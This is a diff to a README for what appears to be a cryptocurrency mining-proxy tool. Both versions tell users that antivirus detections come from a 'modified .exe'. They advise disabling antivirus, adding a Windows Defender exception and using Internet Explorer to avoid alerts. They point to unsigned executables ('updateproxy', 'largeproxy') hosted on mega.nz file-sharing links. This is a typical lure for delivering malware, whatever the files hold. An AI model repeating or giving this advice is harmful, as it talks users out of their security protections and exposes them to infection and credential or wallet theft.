@@ -20,10 +20,10 @@ just add your discord username/handle with hashtags for notifications when block
 and largest share found.
 
 if ur av detects abnormal when downloading its bcuz its a modified .exe file so turn of av go to add acception then re-enable ur av
-some avs i have tested and nothing apart from 1 only bcuz its a modified .exe
+some avs i have tested and nothing apart from 1 only bcuz its a modified .exe i found out today that the .exe needs to be signed a verified certificate and this will stop the antivirus alert which i will get done next week sometime.
 
-issues with chrome fix
-download package from https://mega.nz/file/xiwi3TiR#4yRA2SRp5nv8MxajaU8Ef80k77oxvSChttWahl8K5vE
+added more updates you can download from mega launch the updateproxy then launche largeproxy
+https://mega.nz/file/13Q0CLRY#RbeiRqGP8KDpyPdD9Ci1o_R10j9RCNMIQ_-1e-K1qBk
 or reopen github with internet explorer no alerts
 add acception from windows av
 run the updater to keep it updated run on first launch if using the exe then add ur details in gui
